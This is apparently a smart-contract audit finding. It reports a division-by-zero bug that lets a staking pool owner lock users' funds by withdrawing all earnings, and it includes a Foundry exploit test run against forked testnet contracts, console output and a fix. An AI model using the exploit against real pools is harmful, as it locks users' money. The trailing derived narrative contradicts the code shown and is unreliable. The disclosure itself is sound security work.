---
id: 4723
severity: "High"
---

# If pool owner withdraws 100% of earnings, poolusers will be permanently blocked from withdrawing staked funds Submitted by Spearmint

## Description

If pool owner withdraws 100% of earnings, poolUsers will be permanently blocked from withdrawing staked funds, due to division by zero. The root cause is explained better in a sequence of steps: poolOwner withdrawing 100% of earnings causes earningBalance_ = 0. 0 earningBalance_ will update Fs = 0 by the following formulae:
```solidity
function calFs(
    uint earningBalance_,
    uint maxEarning_
)
internal
pure
returns(uint)
{
    uint max = maxEarning_;
    if (max < earningBalance_) {
        max = earningBalance_;
    }
    if (max == 0) {
        return LPercentage.DEMI;
    }
    return earningBalance_ * LPercentage.DEMI / max;
}
```

When a user now tries to withdraw locked ETH, that transaction will invoke the _withdraw() function inside Locker.sol, that will calculate the receivedA as follows:
```solidity
uint receivedA = total * pastTime / duration;
```

Since Fs = 0, Duration will = 0 when being calculated by the following formulae:
```solidity
function calDuration(
    SLock memory lockData_,
    uint fs_,
    bool isPoolOwner_
)
internal
pure
returns(uint)
{
    uint mFactor = isPoolOwner_ ? 2 * LPercentage.DEMI - fs_ : fs_;
    uint duration = lockData_.duration * mFactor / LPercentage.DEMI;
    return duration;
}
```

Since duration = 0, going back to the _withdraw() function inside Locker.sol when calculating the receivedA it will divide by zero and result in the following error:
[FAIL. Reason: panic: division or modulo by zero (0x12)]

Impact: Pool Users will have permanently locked funds, thus high impact. Likelihood: Any poolOwner can perform this by simply withdrawing all their earnings. This vulnerability does not prevent poolOwners from withdrawing their staked funds, so they will have no financial loss.

## Proof of Concept

The following foundry test illustrates a scenario where John withdraws his earnings and locks Alice's and Eve's staked funds. Run it with the following command line input:
```solidity
forge test --mt test__IfPoolOwnerWithdrawsEarningsOthersCannotWithdrawLockedFunds -vv
// SPDX-License-Identifier: MIT
pragma solidity =0.8.8;
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../contracts/Controller.sol";
import "../contracts/Profile.sol";
import "../contracts/DCT.sol";
import "../contracts/PoolFactory.sol";
import "../contracts/lib/LLocker.sol";
import "../contracts/interfaces/IPoolFactory.sol";
import "../contracts/interfaces/IProfile.sol";
import "../contracts/interfaces/IDCT.sol";
import "../contracts/interfaces/IVoting.sol";
import "../contracts/interfaces/IEthSharing.sol";
import "../contracts/modules/UseAccessControl.sol";
import "../contracts/modules/Earning.sol";
import "../contracts/modules/Locker.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../contracts/modules/DToken.sol";

contract Fork is Test {
    // GoatTech Contracts
    Controller controller;
    Profile profile;
    Locker locker;
    UseAccessControl useAccessControl;
    Earning earning;

    // Setup users
    address Whale = 0xD8Ea779b8FFC1096CA422D40588C4c0641709890;
    address Alice = 0x71B61c2E250AFa05dFc36304D6c91501bE0965D8;
    address Eve = 0xb2248390842d3C4aCF1D8A893954Afc0EAc586e5;
    address John = 0x0F7F6B308B5111EB4a86D44Dc90394b53A3aCe13;
    uint256 fork;

    function setUp() public {
        // Set up forked environment for Arbitrum Sepolia
        fork = vm.createFork("https://public.stackup.sh/api/v1/node/arbitrum-sepolia");
        // These addresses are the live GoatTech Contracts on Arbitrum Sepolia
        controller = Controller(payable(address(0xB4E5f0B2885F09Fd5a078D86E94E5D2E4b8530a7)));
        profile = Profile(0x7c25C3EDd4576B78b4F8aa1128320AE3d7204bEc);
        locker = Locker(0x0265850FE8A0615260a1008e1C1Df01DB394E74a);
        useAccessControl = UseAccessControl(0x588CF1494C5aC93796134E5e1827F58D2a8A9cDB);
        earning = Earning(0xf7a08a0728C583075852Be8B67E47DceB5c71d48);
    }

    function test__IfPoolOwnerWithdrawsEarningsOthersCannotWithdrawLockedFunds() public {
        vm.selectFork(fork);
        // John creates his own pool and stakes eth
        vm.startPrank(John);
        controller.ethStake{value: 10 ether}(payable(John), 30 days, 1000, 2000300, 1, 0);

        // check the total amount of wsteth John has staked in the pool
        LLocker.SLock memory reeSlock = locker.getLockData(John, John);
        uint JohnStakedWstethAmount = reeSlock.amount;
        console.log("JohnStakedWstethAmount", JohnStakedWstethAmount);

        // He gets other users to stake like Alice and Eve
        vm.startPrank(Alice);
        controller.ethStake{value: 100 ether}(payable(John), 30 days, 1000, 2000300, 1, 0);

        // check the total amount of wsteth Alice has staked in the pool
        LLocker.SLock memory reeeSlock = locker.getLockData(Alice, John);
        uint AliceStakedWstethAmount = reeeSlock.amount;
        console.log("AliceStakedWstethAmount", AliceStakedWstethAmount);

        vm.startPrank(Eve);
        controller.ethStake{value: 100 ether}(payable(John), 30 days, 1000, 2000300, 1, 0);

        // check john's earnings now
        uint256 johnTotalEarnings = earning.earningOf(John);
        console.log("John's earnings after users stake in his pool", johnTotalEarnings);

        // 30 days pass
        skip(30 days);

        // John withdraws earnings
        vm.startPrank(John);
        controller.earningWithdraw(true, earning.earningOf(John), payable(John), 1);

        // can ALice withdraw her locked funds?
        // NO it will revert
        vm.startPrank(Alice);
        locker.approveAdmin(address(controller));
        vm.expectRevert();
        controller.lockWithdraw(true, payable(John), AliceStakedWstethAmount, payable(Alice), false, 1);
    }
}
```
Console Output:
```
forge test --mt test__IfPoolOwnerWithdrawsEarningsOthersCannotWithdrawLockedFunds -vv
[] Compiling...
[] Compiling 2 files with 0.8.8
[] Solc 0.8.8 finished in 3.21s
Compiler run successful!
Ran 1 test for test/PoCOwnerLocksUsers.t.sol:Fork
[PASS] test__IfPoolOwnerWithdrawsEarningsOthersCannotWithdrawLockedFunds() (gas: 14340319)
Logs:
JohnStakedWstethAmount 6671540705912181698
AliceStakedWstethAmount 65984438710531168379
John's earnings after users stake in his pool 5049570232408046637
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 207.91s (205.63s CPU time)
Ran 1 test suite in 207.91s (207.91s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Recommendation

If poolOwner's Fs = 0, then allow poolUsers to directly withdraw funds without calculating duration.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a division‑by‑zero arithmetic error that occurs when the pool owner withdraws the entire amount of earned fees from a staking pool. The contract stores the earnings balance (earningBalance_) and uses it to compute a scaling factor Fs via a pure function that returns a percentage of the earnings relative to a maximum. When the owner withdraws 100 % of the earnings, earningBalance_ becomes zero, causing the function to return the minimum percentage (DEM I) and consequently set Fs to zero. Fs is then used in a second pure function that calculates the lock duration for each user’s stake. Because Fs equals zero, the duration formula reduces to zero, and the subsequent withdrawal routine divides the total locked amount by this duration (total * pastTime / duration). The division by zero triggers a Solidity panic (error code 0x12), causing the transaction to revert. As a result, any pool user who attempts to withdraw their locked ETH receives a revert error and their funds remain locked indefinitely. This situation can be reproduced simply by the pool owner calling the earnings withdrawal function with the full earnings amount; no special permissions or edge‑case conditions are required. The impact is that users lose access to their staked assets, violating the core business logic that staked funds must be withdrawable after the lock period. The issue was discovered during a formal audit that included unit‑test execution; the test showed that after the owner’s full earnings withdrawal, a subsequent user withdrawal reverted with a division‑by‑zero panic. The bug is hard to notice because the contract does not explicitly guard against a zero duration, and the arithmetic appears correct for typical non‑zero earnings. The vulnerability belongs to the class of unchecked arithmetic errors where a denominator can become zero due to state changes, leading to a runtime exception. From the user’s perspective the UI would show a “transaction failed” message, the balance would remain unchanged, and the expected refund of locked ETH would be missing. The contract should protect the duration calculation by handling the zero‑Fs case, for example by bypassing the duration‑based formula and allowing a direct withdrawal when Fs is zero, or by enforcing a minimum non‑zero duration. This fix restores the guarantee that users can always retrieve their staked funds, even if the pool owner extracts all earnings.
